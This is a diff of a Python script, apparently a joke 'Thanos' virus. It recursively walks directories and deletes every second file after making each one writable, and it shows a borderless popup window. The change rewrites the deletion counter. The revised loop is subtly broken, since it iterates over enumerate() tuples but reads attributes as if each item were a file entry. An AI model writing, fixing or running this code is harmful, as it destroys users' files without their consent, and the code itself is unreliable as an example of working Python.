@@ -18,7 +18,7 @@ deleted_files = 0
 
 def popUp():
     root = tk.Tk()
-    root.configure(background="systemTransparent")
+    root.configure(background="black")
 
     #To disable the menu
     root.overrideredirect(True)
@@ -50,25 +50,23 @@ async def thanos(dossier):
     
     global deleted_files
     global scanned_files
+    delete_count = 0
 
-    for i, nom_fichier in enumerate(os.scandir(dossier)):
+    for nom_fichier in enumerate(os.scandir(dossier)):
         if nom_fichier.name != 'virus':
             if nom_fichier.is_dir():
                 await thanos(nom_fichier.path)
             else:
-                if i % 2 == 0:
-                    delete = 0
+                if delete_count % 2 == 0:
                     try:
-                        if delete == 0:
-                            os.chmod(nom_fichier.path, 0o644)
-                            os.remove(nom_fichier.path)
-                            deleted_files += 1
-                            print('delete ' + nom_fichier.path)
-                        else:
-                            print('keep')
+                        os.chmod(nom_fichier.path, 0o644)
+                        os.remove(nom_fichier.path)
+                        deleted_files += 1
+                        print('delete ' + nom_fichier.path)
                     except:
                         print('Mixmax')
                 scanned_files += 1
+                delete_count += 1
 
 
 async def main():
